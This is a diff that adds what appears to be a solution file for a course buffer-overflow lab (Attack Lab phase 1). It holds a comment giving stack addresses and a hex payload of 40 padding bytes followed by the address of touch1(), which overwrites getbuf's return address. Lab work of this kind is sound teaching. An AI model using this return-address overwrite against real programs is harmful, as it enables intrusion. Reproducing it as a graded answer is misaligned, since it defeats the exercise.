@@ -1,0 +1,5 @@
+/*
+ * The starting address of buf[] is 0x5561dc78, and the return address of calling getbuf() is stored at
+ * 0x5561dca0. So we add padding of 40 bytes followed by the address 0x4017c0 of touch1().
+ */
+01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 C0 17 40
